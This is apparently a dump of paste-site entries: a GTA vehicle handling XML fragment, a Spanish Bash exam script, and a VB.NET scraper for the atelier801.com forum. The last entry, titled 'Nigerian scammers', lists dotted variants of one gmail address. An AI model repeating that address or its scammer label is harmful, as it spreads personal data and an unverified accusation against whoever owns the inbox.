    </Item>
    <Item type=""CHandlingData"">
      <handlingName>GAUNTLET5</handlingName>
      <fMass value=""1600.000000"" />
      <fInitialDragCoeff value=""7.0"" />
      <fDownforceModifier value=""1.075"" />
      <fPercentSubmerged value=""85.000000"" />
      <vecCentreOfMassOffset x=""0.000000"" y=""0.050000"" z=""0.2000"" />
      <vecInertiaMultiplier x=""1.2500000"" y=""1.500000"" z=""2.0000"" />
      <fDriveBiasFront value=""0.000"" />
      <nInitialDriveGears value=""5"" />
      <fInitialDriveForce value=""0.27500"" />
      <fDriveInertia value=""1.000000"" />
      <fClutchChangeRateScaleUpShift value=""1.500000"" />
      <fClutchChangeRateScaleDownShift value=""2.00000"" />
      <fInitialDriveMaxFlatVel value=""130.000000"" />
      <fBrakeForce value=""0.5000"" />
      <fBrakeBiasFront value=""0.62500"" />
      <fHandBrakeForce value=""0.75000"" />
      <fSteeringLock value=""40.000000"" />
      <fTractionCurveMax value=""1.7000"" />
      <fTractionCurveMin value=""1.6000"" />
      <fTractionCurveLateral value=""23.00000"" />
      <fTractionSpringDeltaMax value=""0.100"" />
      <fLowSpeedTractionLossMult value=""0.500"" />
      <fCamberStiffnesss value=""0.000000"" />
      <fTractionBiasFront value=""0.4900"" />
      <fTractionLossMult value=""0.33300"" />
      <fSuspensionForce value=""3.0000"" />
      <fSuspensionCompDamp value=""1.20000"" />
      <fSuspensionReboundDamp value=""1.20000"" />
      <fSuspensionUpperLimit value=""0.1250000"" />
      <fSuspensionLowerLimit value=""-0.125000"" />
      <fSuspensionRaise value=""0.000000"" />
      <fSuspensionBiasFront value=""0.500000"" />
      <fAntiRollBarForce value=""0.000"" />
      <fAntiRollBarBiasFront value=""0.50000"" />
      <fRollCentreHeightFront value=""0.2500"" />
      <fRollCentreHeightRear value=""0.250"" />
      <fCollisionDamageMult value=""0.700000"" />
      <fWeaponDamageMult value=""1.000000"" />
      <fDeformationDamageMult value=""0.700000"" />
      <fEngineDamageMult value=""1.500000"" />
      <fPetrolTankVolume value=""65.000000"" />
      <fOilVolume value=""5.000000"" />
      <fSeatOffsetDistX value=""0.150000"" />
      <fSeatOffsetDistY value=""0.000000"" />
      <fSeatOffsetDistZ value=""0.000000"" />
      <nMonetaryValue value=""25000"" />
      <strModelFlags>440010</strModelFlags>
      <strHandlingFlags>820100</strHandlingFlags>
      <strDamageFlags>0</strDamageFlags>
      <AIHandling>SPORTS_CAR</AIHandling>      
      <fPopUpLightRotation value=""57.50000""/>
      <SubHandlingData> 
        <Item type=""CCarHandlingData"">
          <strAdvancedFlags>1C000000</strAdvancedFlags>
          <AdvancedData>
            <Item type=""CAdvancedData"">
              <Slot value=""13""/>
              <Index value=""1""/>
              <Value value=""0.7""/>
            </Item>
            <Item type=""CAdvancedData"">
              <Slot value=""13""/>
              <Index value=""2""/>
              <Value value=""0.7""/>
            </Item>
          </AdvancedData>
        </Item>
        <Item type=""NULL"" />
        <Item type=""NULL"" />
      </SubHandlingData>
    </Item>"
sa8DiJ1h,ejercicio examen,kuroshan1104,Bash,Tuesday 4th of July 2023 08:27:12 PM CDT,"#!/bin/bash

# Inicializar el arreglo
declare -a numeros

# Leer los 12 números
echo ""Ingrese los 12 números:""
for ((i=0; i<12; i++))
do
    read -p ""Número $(($i+1)): "" num
    numeros[$i]=$num
done

# Calcular la resta de todos los números
resta=0
for ((i=0; i<12; i++))
do
    resta=$(($resta - ${numeros[$i]}))
done
echo ""La resta de todos los números es: $resta""

# Contar los números impares y calcular su porcentaje
impares=0
for ((i=0; i<12; i++))
do
    if [ $(( ${numeros[$i]} % 2 )) -ne 0 ]; then
        impares=$(($impares + 1))
    fi
done
porcentaje=$(awk ""BEGIN { pc=($impares / 12) * 100; i=int(pc); print (pc-i<0.5)?i:i+1 }"")
echo ""La cantidad de números impares es: $impares""
echo ""El porcentaje de números impares es: $porcentaje%""

# Encontrar el número que se repite más veces
num_repetido=""""
max_repeticiones=0

for ((i=0; i<12; i++))
do
    repeticiones=0
    for ((j=0; j<12; j++))
    do
        if [ ${numeros[$i]} -eq ${numeros[$j]} ]; then
            repeticiones=$(($repeticiones + 1))
        fi
    done

    if [ $repeticiones -gt $max_repeticiones ]; then
        max_repeticiones=$repeticiones
        num_repetido=${numeros[$i]}
    fi
done

echo ""El número que se repite más veces es: $num_repetido""
"
eSTASnER,modNewForum.vb,AdamBlast,VB.NET,Tuesday 4th of July 2023 08:16:49 PM CDT,"Imports System.Net
Imports System.Text.RegularExpressions
Imports System.Web
Module modNewForum

    Public Structure NewForumPostData
        Dim Username As String
        Dim Message As String
        Dim PostNo As Integer
        Dim PostDate As String
    End Structure

    Public Structure ThreadTitleAndID
        Dim Author As String
        Dim LastReplyName As String
        Dim LastReplyTime As DateTime
        Dim Title As String
        Dim ID As Integer
        Dim RawPost As String
        Dim URL As String
        Dim TimeCreated As DateTime
        Dim Locked As Boolean
        Dim PostIt As Boolean
        Dim Poll As Boolean
        Dim NoMessages As Integer
        Dim Messages As List(Of NewForumPostData)
    End Structure


    Public Function GetNewForumLastPage(ByVal intT As Integer) As Integer
        Dim intLastMapPage As Integer = 1
        Try
            Dim wbClient As New WebClient
            Dim strPage As String = wbClient.DownloadString(""https://atelier801.com/topic?f=6&t="" & intT)

            If Regex.IsMatch(strPage, Regex.Escape(""<a class=""""btn btn-inverse"""" href=""""#"""" active"") & "".*?>"" & ""(?<pages>.+?)"" & ""<"", RegexOptions.Multiline And RegexOptions.IgnoreCase) Then
                Dim matchPages As Match = Regex.Match(strPage, Regex.Escape(""<a class=""""btn btn-inverse"""" href=""""#"""" active"") & "".*?>"" & ""(?<pages>.+?)"" & ""<"", RegexOptions.Multiline And RegexOptions.IgnoreCase)
                intLastMapPage = matchPages.Groups(""pages"").Value.Split(""/"")(1).Trim
            Else
                intLastMapPage = 1
            End If
        Catch ex As Exception
            intLastMapPage = 1
        End Try

        Return intLastMapPage
    End Function

    Public Function GetNewFormPosts(ByVal intT As Integer, ByVal intP As Integer) As List(Of NewForumPostData)
        Dim lstNewForumPosts As New List(Of NewForumPostData)
        Dim wbClient As New WebClient
        wbClient.Encoding = System.Text.UTF8Encoding.UTF8
        Dim strPage As String = wbClient.DownloadString(""https://atelier801.com/topic?f=6&t="" & intT & ""&p="" & intP)
        'https://atelier801.com/topic?f=6&t=48020&p=1

        strPage = strPage.Replace(vbLf, """").Replace(vbCr, """")

        Dim matchNames As MatchCollection = Regex.Matches(strPage, ""<span class=""""date-ms hidden"""" data-afficher-secondes=""""false"""">"" & ""(?<postdate>.+?)"" & ""</span>"" & _
"".*?"" & ""href=""""profile\?pr="" & ""(?<user>.+?)"" & """""">"" & _
"".*?"" & ""<a class=""""numero-message"""""" & "".*?"" & """""">"" & ""(?<postno>.+?)"" & ""</a>"" & _
"".*?"" & ""<div class=""""cadre-message-message"""">"" & ""(?<message>.+?)"" & ""</div>"", RegexOptions.Multiline And RegexOptions.IgnoreCase)

        'strPage = strPage.Replace(vbLf, """").Replace(vbCr, """")

        '        Dim matchNames As MatchCollection = Regex.Matches(strPage, ""<span class=""""date-ms hidden"""" data-afficher-secondes=""""false"""">"" & ""(?<postdate>.+?)"" & ""</span>"" & _
        '"".*?"" & ""href=""""profile\?pr="" & ""(?<user>.+?)"" & """""">"" & _
        '"".*?"" & ""<a class=""""numero-message"""""" & "".*?"" & """""">"" & ""(?<postno>.+?)"" & ""</a>"" & _
        '"".*?"" & ""<div id=""""message_\d\d?\d?\d?\d?\d?\d?\d?\d?\d?\d?\d?\d?\d?\d?"""">"" & ""(?<message>.+?)"" & ""</div>"", RegexOptions.Multiline And RegexOptions.IgnoreCase)

        For Each UserName As Match In matchNames
            Dim currPost As New NewForumPostData
            currPost.Username = StrConv(UserName.Groups(""user"").Value.Trim, vbProperCase)
            If Regex.IsMatch(currPost.Username, ""%2B"", RegexOptions.IgnoreCase) Then
                currPost.Username = Regex.Replace(currPost.Username, ""%2B"", """", RegexOptions.IgnoreCase)
                currPost.Username = ""+"" & StrConv(currPost.Username, vbProperCase)
            End If
            currPost.Message = UserName.Groups(""message"").Value.Trim

            currPost.Message = Regex.Replace(currPost.Message, ""<div id="""".*?"""">"", """", RegexOptions.IgnoreCase)
            currPost.Message = Regex.Replace(currPost.Message, ""<div>"", """", RegexOptions.IgnoreCase)
            currPost.Message = Regex.Replace(currPost.Message, ""<span class=""""cadre-message-modere-texte"""">"", """", RegexOptions.IgnoreCase)
            currPost.Message = Regex.Replace(currPost.Message, ""</span>"", """", RegexOptions.IgnoreCase)
            currPost.PostNo = UserName.Groups(""postno"").Value.Trim.Replace(""#"", """")
            currPost.PostDate = UserName.Groups(""postdate"").Value.Trim
            lstNewForumPosts.Add(currPost)
        Next

        Return lstNewForumPosts
    End Function




    '    Public Function GetNewFormPosts(ByVal intT As Integer, ByVal intP As Integer) As List(Of NewForumPostData)
    '        Dim lstNewForumPosts As New List(Of NewForumPostData)
    '        Dim wbClient As New WebClient
    '        Dim strPage As String = wbClient.DownloadString(""https://atelier801.com/topic?f=6&t="" & intT & ""&p="" & intP)

    '        strPage = strPage.Replace(vbLf, """").Replace(vbCr, """")

    '        Dim matchNames As MatchCollection = Regex.Matches(strPage, ""<span class=""""date-ms hidden"""" data-afficher-secondes=""""false"""">"" & ""(?<postdate>.+?)"" & ""</span>"" & _
    '"".*?"" & ""href=""""profile\?pr="" & ""(?<user>.+?)"" & """""">"" & _
    '"".*?"" & ""<a class=""""numero-message"""""" & "".*?"" & """""">"" & ""(?<postno>.+?)"" & ""</a>"" & _
    '"".*?"" & ""<div id=""""message_\d\d?\d?\d?\d?\d?\d?\d?\d?\d?\d?\d?\d?\d?\d?"""">"" & ""(?<message>.+?)"" & ""</div>"", RegexOptions.Multiline And RegexOptions.IgnoreCase)







    '        For Each UserName As Match In matchNames

    '            Dim currPost As New NewForumPostData
    '            currPost.Username = StrConv(UserName.Groups(""user"").Value.Trim, vbProperCase)
    '            If Regex.IsMatch(currPost.Username, ""%2B"", RegexOptions.IgnoreCase) Then
    '                currPost.Username = Regex.Replace(currPost.Username, ""%2B"", ""+"", RegexOptions.IgnoreCase)
    '            End If
    '            currPost.Message = UserName.Groups(""message"").Value.Trim

    '            currPost.Message = Regex.Replace(currPost.Message, ""<div id="""".*?"""">"", """", RegexOptions.IgnoreCase)
    '            currPost.Message = Regex.Replace(currPost.Message, ""<div>"", """", RegexOptions.IgnoreCase)
    '            currPost.Message = Regex.Replace(currPost.Message, ""<span class=""""cadre-message-modere-texte"""">"", """", RegexOptions.IgnoreCase)
    '            currPost.Message = Regex.Replace(currPost.Message, ""</span>"", """", RegexOptions.IgnoreCase)
    '            currPost.PostNo = UserName.Groups(""postno"").Value.Trim.Replace(""#"", """")
    '            currPost.PostDate = UserName.Groups(""postdate"").Value.Trim
    '            lstNewForumPosts.Add(currPost)
    '        Next

    '        Return lstNewForumPosts
    '    End Function

    Public Function FormatForumDate(ByVal strDate As String) As String
        Dim currDate As DateTime = ConvertForumTimestamp(strDate)

        Dim strOutput As String = currDate.ToString(""dd/MM/yyyy HH:mm"")

        Return strOutput
    End Function

    Public Function GetAtelierThreadListNew(ByVal strPage As String, Optional ByVal booIsInbox As Boolean = False) As List(Of ThreadTitleAndID)
        'Replace multiple spaces with single spaces
        strPage = Regex.Replace(strPage, "" {2,}"", "" "")

        Dim lstOutput As New List(Of ThreadTitleAndID)

        'Match each thread
        Dim matchThreads As MatchCollection = Regex.Matches(strPage, ""<a class=""""cadre-sujet-titre lien-blanc"""" href=""""(?<link>.*?)""""> ?(<img src=""""\/img\/icones\/(?<postIt>postit)\.png"""".*?\/>)? ?(<img src=""""\/img\/icones\/(?<locked>cadenas)\.png"""".*?\/>)? ?(<img src=""""\/img\/icones\/(?<poll>sondage)\.png"""".*?\/> )?(?<title>.*?)<\/a>.*?<a class=""""nombre-messages.*?>(?<noMessages>\d{1,1000})<\/a>.*?<span class=""""date-ms hidden"""".*?>(?<timeLastReply>.*?)<\/span>.*?<a class=""""lien-blanc"""" href=""""profile\?pr=(?<userName>.*?)"""">.*?href=""""(?<threadURL>topic\?f=\d\d?&t=(?<threadID>\d{1,10}))"""">.*?<span.*?><img src=""""img\/icones\/16\/on-offbis(?<online>\d)\.png"""".*?>(?<lastReply>.*?)<\/span>.*?date-ms hidden.*?>(?<timeCreated>.*?)<\/span>"", RegexOptions.IgnoreCase Or RegexOptions.Singleline Or RegexOptions.Multiline)
        For Each currThread As Match In matchThreads

            'WriteLogBalls(currThread.Value & vbNewLine & vbNewLine & vbNewLine)
            Dim newThread As New ThreadTitleAndID
            newThread.ID = currThread.Groups(""threadID"").Value
            newThread.Title = HttpUtility.HtmlDecode(currThread.Groups(""title"").Value.Trim)
            newThread.RawPost = currThread.Value
            newThread.URL = ""https://atelier801.com/"" & currThread.Groups(""threadURL"").Value

            newThread.Author = StrConv(HttpUtility.UrlDecode(currThread.Groups(""userName"").Value), vbProperCase)
            newThread.TimeCreated = ConvertForumTimestamp(currThread.Groups(""timeCreated"").Value)
            newThread.LastReplyName = StrConv(HttpUtility.UrlDecode(currThread.Groups(""lastReply"").Value), vbProperCase)
            newThread.LastReplyTime = ConvertForumTimestamp(currThread.Groups(""timeLastReply"").Value)
            newThread.NoMessages = CInt(currThread.Groups(""noMessages"").Value.Trim)

            newThread.Locked = currThread.Groups(""locked"").Value.Length
            newThread.PostIt = currThread.Groups(""postIt"").Value.Length
            newThread.Poll = currThread.Groups(""poll"").Value.Length

            lstOutput.Add(newThread)

            'MsgBox(""ID: "" & newThread.ID & vbNewLine &
            '       ""Title: "" & newThread.Title & vbNewLine &
            '       ""URL: "" & newThread.URL & vbNewLine &
            '       ""Author: "" & newThread.Author & vbNewLine &
            '       ""Time created: "" & newThread.TimeCreated.ToString(""MMM d, yyyy"") & vbNewLine &
            '       ""Last reply time: "" & newThread.LastReplyTime.ToString(""MMM d, yyyy"") & vbNewLine &
            '       ""Last reply name: "" & newThread.LastReplyName & vbNewLine &
            '       ""# messages: "" & newThread.NoMessages & vbNewLine &
            '       ""Locked: "" & newThread.Locked & vbNewLine &
            '       ""PostIt: "" & newThread.PostIt & vbNewLine &
            '       ""Poll: "" & newThread.Poll & vbNewLine)
        Next
        Return lstOutput
    End Function

    Public Function GetAtelierThreadList(ByVal strPage As String, Optional ByVal booIsInbox As Boolean = False) As List(Of ThreadTitleAndID)
        Dim lstOutput As New List(Of ThreadTitleAndID)

        strPage = strPage.Replace(vbLf, """").Replace(vbCr, """")


        'Dim matchThreads As MatchCollection = Regex.Matches(strPage, ""<a class=""""cadre-sujet-titre lien-blanc"""".*?<div class=""""span12"""">"", RegexOptions.Multiline And RegexOptions.IgnoreCase)
        Dim matchThreads As MatchCollection = Regex.Matches(strPage, ""<table class=""""table-cadre table-cadre-centree"""">.*?<\/table>"", RegexOptions.Multiline Or RegexOptions.IgnoreCase)


        For Each threadToCheck As Match In matchThreads
            Dim matchTopic As String = """"

            If booIsInbox Then
                matchTopic = Regex.Match(threadToCheck.Value, ""conversation.*?co=\d\d?\d?\d?\d?\d?\d?\d?\d?"", RegexOptions.IgnoreCase).Value
                matchTopic = Regex.Match(matchTopic, ""\d\d?\d?\d?\d?\d?\d?\d?\d?$"", RegexOptions.IgnoreCase).Value
            Else
                matchTopic = Regex.Match(threadToCheck.Value, ""topic.*?t=\d\d?\d?\d?\d?\d?\d?\d?\d?"", RegexOptions.IgnoreCase).Value
                matchTopic = Regex.Match(matchTopic, ""\d\d?\d?\d?\d?\d?\d?\d?\d?$"", RegexOptions.IgnoreCase).Value
            End If





            Dim matchTitle As String = Regex.Match(threadToCheck.Value, ""<a class=""""cadre-sujet-titre lien-blanc"" & "".*?"" & ""</a>"", RegexOptions.IgnoreCase).Value
            matchTitle = Regex.Replace(matchTitle, ""<.*?>"", """", RegexOptions.IgnoreCase).Trim

            Dim matchLink As String = ""https://atelier801.com/"" & Regex.Match(threadToCheck.Value, ""href="""""" & ""(?<link>.*?)"" & """""""", RegexOptions.IgnoreCase).Groups(""link"").Value.Trim

            Dim matchAuthors As MatchCollection = Regex.Matches(threadToCheck.Value, ""alt=""""""""\>"" & ""(?<author>.*?)"" & ""\</span\>"", RegexOptions.IgnoreCase)

            'Dim matchTimeCreated As String = Regex.Match(threadToCheck.Value, "" le <span class=""""date-ms hidden"""" .*?>"" & ""(?<time>.*?)"" & ""</span>"", RegexOptions.IgnoreCase).Groups(""time"").Value.Trim
            Dim matchTimeCreated As String = Regex.Match(threadToCheck.Value, ""<span class=""""date-ms hidden"""" .*?>"" & ""(?<time>.*?)"" & ""</span>"", RegexOptions.IgnoreCase).Groups(""time"").Value.Trim

            Dim matchlastPost As Match = Regex.Match(threadToCheck.Value, ""<span class=""""date-ms hidden"""" data-afficher-secondes=""""false"""">"" & ""(?<time>.*?)"" & ""</span>"", RegexOptions.IgnoreCase)

            Dim matchNoMessages As Match = Regex.Match(threadToCheck.Value, ""\<a class=""""nombre-messages .*?\>(?<nomessages>.*?)\<\/a\>"", RegexOptions.IgnoreCase)



            Dim newThread As New ThreadTitleAndID
            newThread.ID = matchTopic
            newThread.Title = HttpUtility.HtmlDecode(matchTitle)
            newThread.RawPost = threadToCheck.Value
            newThread.URL = matchLink

            'Remove link to post and page number
            newThread.URL = Regex.Replace(newThread.URL, ""#m\d\d?\d?\d?\d?\d?$"", """", RegexOptions.IgnoreCase)
            newThread.URL = Regex.Replace(newThread.URL, ""&p=\d\d?\d?\d?\d?\d?$"", """", RegexOptions.IgnoreCase)

            'Add max posts shown to 100
            newThread.URL = newThread.URL & ""&n=100""

            newThread.Author = matchAuthors(0).Groups(""author"").Value 'matchAuthors(1).Groups(""author"").Value
            newThread.TimeCreated = ConvertMinutesTimestamp(matchTimeCreated)
            newThread.LastReplyName = """" 'matchAuthors(0).Groups(""author"").Value
            newThread.LastReplyTime = ConvertMinutesTimestamp(matchlastPost.Groups(""time"").Value.Trim)
            newThread.NoMessages = CInt(matchNoMessages.Groups(""nomessages"").Value.Trim)

            If threadToCheck.Value.Contains(""<img src=""""/img/icones/cadenas.png"""""") Then
                newThread.Locked = True
            Else
                newThread.Locked = False
            End If

            If threadToCheck.Value.Contains(""<img src=""""/img/icones/postit.png"""""") Then
                newThread.PostIt = True
            Else
                newThread.PostIt = False
            End If

            lstOutput.Add(newThread)

            'WriteLogBalls(newThread.ID & "" : "" & newThread.Title & "" : "" & newThread.RawPost & "" : "" & newThread.URL & "" : "" & newThread.Author & "" : "" & newThread.TimeCreated & "" : "" & newThread.LastReplyName & "" : "" & newThread.LastReplyTime & "" : "" & newThread.NoMessages)
        Next





        Return lstOutput
    End Function

    Public Function ConvertMinutesTimestamp(ByVal timestamp As String) As DateTime

        Return New DateTime(1970, 1, 1, 0, 0, 0).AddMilliseconds(timestamp).AddHours(-4)

    End Function

    Public Function GetInboxMessagesSource(ByVal strPage As String) As List(Of NewForumPostData)
        Dim lstOutput As New List(Of NewForumPostData)

        Dim matchPostsOnPage As MatchCollection = Regex.Matches(strPage, _
        ""<span class=""""date-ms .*?>(?<timeofpost>.*?)<\/span>.*?profile\?pr=(?<username>.*?)"""">.*?<div id=""""citer_message.*?>(?<message>.*?)<\/div>.*?<a class=""""numero-message"""".*?>(?<postno>.*?)<\/a>"", RegexOptions.Singleline Or RegexOptions.IgnoreCase)

        For Each postMatch As Match In matchPostsOnPage
            Dim currPost As New NewForumPostData
            currPost.Username = StrConv(postMatch.Groups(""username"").Value.Trim, vbProperCase)
            If Regex.IsMatch(currPost.Username, ""%2B"", RegexOptions.IgnoreCase) Then
                currPost.Username = Regex.Replace(currPost.Username, ""%2B"", """", RegexOptions.IgnoreCase)
                currPost.Username = ""+"" & StrConv(currPost.Username, vbProperCase)
            End If
            currPost.Message = HttpUtility.HtmlDecode(postMatch.Groups(""message"").Value.Trim)
            currPost.Message = currPost.Message.Replace(vbLf, vbLf & Chr(9))
            currPost.PostNo = postMatch.Groups(""postno"").Value.Trim.Replace(""#"", """")

            currPost.PostDate = postMatch.Groups(""timeofpost"").Value.Trim
            lstOutput.Add(currPost)
        Next

        Return lstOutput
    End Function

    Public Function GetNewFormPostsSource(ByVal strPage As String) As List(Of NewForumPostData)
        Dim lstNewForumPosts As New List(Of NewForumPostData)

        'Dim matchForumPost As MatchCollection = Regex.Matches(strPage, ""<span class=""""date-minutes hidden"""">"" & ""(?<postdate>.+?)"" & ""</span>"" & _
        '"".*?"" & ""href=""""profile\?pr="" & ""(?<user>.+?)"" & """""">"" & _
        '"".*?"" & ""<a class=""""numero-message"""""" & "".*?"" & """""">"" & ""(?<postno>.+?)"" & ""</a>"" & _
        '"".*?"" & ""<div class=""""cadre-message-message"""">"" & ""(?<message>.+?)"" & ""</div>"", RegexOptions.Singleline Or RegexOptions.IgnoreCase)
        Dim matchForumPost As MatchCollection = Regex.Matches(strPage, ""<span class=""""date-ms hidden"""" data-afficher-secondes=""""false"""">"" & ""(?<postdate>.+?)"" & ""</span>"" & _
"".*?"" & ""href=""""profile\?pr="" & ""(?<user>.*?)"" & """""">"" & _
"".*?"" & ""<a class=""""numero-message"""""" & "".*?"" & """""">"" & ""(?<postno>.*?)"" & ""</a>"" & _
"".*?"" & ""<div class=""""cadre-message-message"""">"" & ""(?<message>.*?)"" & ""</div>"", RegexOptions.Singleline Or RegexOptions.IgnoreCase)

        For Each postMatch As Match In matchForumPost
            Dim currPost As New NewForumPostData
            currPost.Username = StrConv(postMatch.Groups(""user"").Value.Trim, vbProperCase)
            If Regex.IsMatch(currPost.Username, ""%2B"", RegexOptions.IgnoreCase) Then
                currPost.Username = Regex.Replace(currPost.Username, ""%2B"", """", RegexOptions.IgnoreCase)
                currPost.Username = ""+"" & StrConv(currPost.Username, vbProperCase)
            End If


            currPost.Message = postMatch.Groups(""message"").Value.Trim

            currPost.Message = Regex.Replace(currPost.Message, ""<div id="""".*?"""">"", """", RegexOptions.IgnoreCase)
            currPost.Message = Regex.Replace(currPost.Message, ""<div>"", """", RegexOptions.IgnoreCase)
            currPost.Message = Regex.Replace(currPost.Message, ""<span class=""""cadre-message-modere-texte"""">"", """", RegexOptions.IgnoreCase)
            currPost.Message = Regex.Replace(currPost.Message, ""</span>"", """", RegexOptions.IgnoreCase)
            currPost.Message = HttpUtility.HtmlDecode(currPost.Message)

            currPost.Message = Regex.Replace(currPost.Message, Regex.Escape(""<span style=""""font-family:Tahoma;""""><span style=""""font-size:10px;"""">=^<span style=""""color:#30BA76;"""">?<span style=""""font-size:10px;"""">?<span style=""""color:#30BA76;"""">?^<span style=""""font-size:10px;"""">=""), """", RegexOptions.IgnoreCase)
            currPost.Message = Regex.Replace(currPost.Message, Regex.Escape(""<span style=""""font-family:Tahoma;""""><span style=""""font-size:10px;"""">=＾<span style=""""color:#30BA76;"""">●<span style=""""font-size:10px;"""">⋏<span style=""""color:#30BA76;"""">●＾<span style=""""font-size:10px;"""">=""), """", RegexOptions.IgnoreCase)
            currPost.Message = Regex.Replace(currPost.Message, ""<br ?/?>"", "" "", RegexOptions.IgnoreCase)

            Dim matchLinks As MatchCollection = Regex.Matches(currPost.Message, ""<a href.*?</a>"", RegexOptions.IgnoreCase)
            For Each link As Match In matchLinks
                Dim matchCurrLink As Match = Regex.Match(link.Value, ""<a href=""""(?<url>.*?)"""".*?>(?<text>.*?)</a>"", RegexOptions.IgnoreCase)
                currPost.Message = Regex.Replace(currPost.Message, Regex.Escape(matchCurrLink.Value), matchCurrLink.Groups(""text"").Value & "": "" & matchCurrLink.Groups(""url"").Value, RegexOptions.IgnoreCase)
            Next

            currPost.PostNo = postMatch.Groups(""postno"").Value.Trim.Replace(""#"", """")
            currPost.PostDate = postMatch.Groups(""postdate"").Value.Trim
            lstNewForumPosts.Add(currPost)
        Next

        Return lstNewForumPosts
    End Function

    Sub WriteLogBalls(ByVal strLine As String)
        Using swWriteLog As New System.IO.StreamWriter(""C:\Users\inkan\Dropbox\new\Mewbzz\0_log.txt"", True)
            swWriteLog.WriteLine(strLine)
        End Using
    End Sub
    Sub WriteLogBalls2(ByVal strLine As String)
        Using swWriteLog As New System.IO.StreamWriter(""C:\Users\inkan\Dropbox\new\Mewbzz\0000_log.txt"", True)
            swWriteLog.WriteLine(strLine)
        End Using
    End Sub

    Public Sub DeleteLogBalls()
        If System.IO.File.Exists(""C:\Users\inkan\Dropbox\new\Mewbzz\0_log.txt"") Then
            System.IO.File.Delete(""C:\Users\inkan\Dropbox\new\Mewbzz\0_log.txt"")
        End If
    End Sub

End Module
"
LCud4nvq,Nigerian scammers [4-7-3/2023],bombaires,HTML,Tuesday 4th of July 2023 08:02:07 PM CDT,"
<a href=""mailto:daninglesoneonone@gmail.com"">daninglesoneonone@gmail.com</a>
<a href=""mailto:d.a.n.in.g.lesoneo.n.on.e@gmail.com"">d.a.n.in.g.lesoneo.n.on.e@gmail.com</a>
<a href=""mailto:dan.i.n.g.le.s.o.neono.ne@gmail.com"">dan.i.n.g.le.s.o.neono.ne@gmail.com</a>
<a href=""mailto:da.n.i.n.g.l.e.son.eonon.e@gmail.com"">da.n.i.n.g.l.e.son.eonon.e@gmail.com</a>
<a href=""mailto:d.a.n.i.ngl.es.oneo.non.e@gmail.com"">d.a.n.i.ngl.es.oneo.non.e@gmail.com</a>
<a href=""mailto:da.n.in.gles.o.n.eo.no.ne@gmail.com"">da.n.in.gles.o.n.eo.no.ne@gmail.com</a>
<a href=""mailto:d.a.n.i.n.g.l.e.s.on.e.on.o.ne@gmail.com"">d.a.n.i.n.g.l.e.s.on.e.on.o.ne@gmail.com</a>
<a href=""mailto:d.an.i.n.gle.s.o.neo.no.ne@gmail.com"">d.an.i.n.gle.s.o.neo.no.ne@gmail.com</a>
<a href=""mailto:da.n.ing.le.s.oneon.o.ne@gmail.com"">da.n.ing.le.s.oneon.o.ne@gmail.com</a>
<a href=""mailto:d.a.ning.les.on.e.on.o.n.e@gmail.com"">d.a.ning.les.on.e.on.o.n.e@gmail.com</a>
<a href=""mailto:da.ni.ngl.es.o.n.e.o.n.o.n.e@gmail.com"">da.ni.ngl.es.o.n.e.o.n.o.n.e@gmail.com</a>
<a href=""mailto:d.a.ni.n.gles.o.neonone@gmail.com"">d.a.ni.n.gles.o.neonone@gmail.com</a>
<a href=""mailto:d.a.ni.n.gles.oneo.none@gmail.com"">d.a.ni.n.gles.oneo.none@gmail.com</a>
<a href=""mailto:d.a.n.ingl.es.on.eon.one@gmail.com"">d.a.n.ingl.es.on.eon.one@gmail.com</a>
<a href=""mailto:da.nin.g.l.e.s.o.n.e.onone@gmail.com"">da.nin.g.l.e.s.o.n.e.onone@gmail.com</a>
<a href=""mailto:da.n.i.n.g.l.e.son.e.onon.e@gmail.com"">da.n.i.n.g.l.e.son.e.onon.e@gmail.com</a>
<a href=""mailto:d.ani.ng.le.s.o.n.e.o.n.o.ne@gmail.com"">d.ani.ng.le.s.o.n.e.o.n.o.ne@gmail.com</a>
<a href=""mailto:d.an.in.g.l.e.so.ne.ono.ne@gmail.com"">d.an.in.g.l.e.so.ne.ono.ne@gmail.com</a>
<a href=""mailto:d.ani.ng.le.so.n.eo.n.o.ne@gmail.com"">d.ani.ng.le.so.n.eo.n.o.ne@gmail.com</a>
<a href=""mailto:danin.gl.e.s.on.e.o.n.on.e@gmail.com"">danin.gl.e.s.on.e.o.n.on.e@gmail.com</a>
<a href=""mailto:da.n.in.g.les.o.neono.n.e@gmail.com"">da.n.in.g.les.o.neono.n.e@gmail.com</a>
<a href=""mailto:da.ni.ng.les.oneono.n.e@gmail.com"">da.ni.ng.les.oneono.n.e@gmail.com</a>
<a href=""mailto:d.a.n.ing.le.so.n.eonone@gmail.com"">d.a.n.ing.le.so.n.eonone@gmail.com</a>
<a href=""mailto:da.ni.n.g.leso.neonone@gmail.com"">da.ni.n.g.leso.neonone@gmail.com</a>
<a href=""mailto:d.a.n.ing.le.so.neo.no.ne@gmail.com"">d.a.n.ing.le.so.neo.no.ne@gmail.com</a>
<a href=""mailto:da.n.i.n.g.les.on.e.on.o.ne@gmail.com"">da.n.i.n.g.les.on.e.on.o.ne@gmail.com</a>
<a href=""mailto:da.n.ing.leso.n.e.o.no.n.e@gmail.com"">da.n.ing.leso.n.e.o.no.n.e@gmail.com</a>
<a href=""mailto:da.nin.gleso.neonon.e@gmail.com"">da.nin.gleso.neonon.e@gmail.com</a>
<a href=""mailto:d.a.ning.les.o.neo.non.e@gmail.com"">d.a.ning.les.o.neo.non.e@gmail.com</a>
<a href=""mailto:d.a.n.i.ngle.so.n.e.o.non.e@gmail.com"">d.a.n.i.ngle.so.n.e.o.non.e@gmail.com</a>
<a href=""mailto:d.a.ni.ngl.eso.ne.o.n.o.n.e@gmail.com"">d.a.ni.ngl.eso.ne.o.n.o.n.e@gmail.com</a>
<a href=""mailto:d.a.n.i.ngles.on.e.o.n.o.ne@gmail.com"">d.a.n.i.ngles.on.e.o.n.o.ne@gmail.com</a>
<a href=""mailto:da.n.i.n.g.lesone.on.one@gmail.com"">da.n.i.n.g.lesone.on.one@gmail.com</a>
<a href=""mailto:danin.g.le.son.eo.no.ne@gmail.com"">danin.g.le.son.eo.no.ne@gmail.com</a>
<a href=""mailto:daning.l.es.one.onone@gmail.com"">daning.l.es.one.onone@gmail.com</a>
<a href=""mailto:da.n.i.ng.l.e.s.on.e.o.n.o.n.e@gmail.com"">da.n.i.ng.l.e.s.on.e.o.n.o.n.e@gmail.com</a>
<a href=""mailto:dani.ngl.e.so.n.eono.n.e@gmail.com"">dani.ngl.e.so.n.eono.n.e@gmail.com</a>
<a href=""mailto:d.a.n.i.n.g.l.es.on.e.o.n.on.e@gmail.com"">d.a.n.i.n.g.l.es.on.e.o.n.on.e@gmail.com</a>
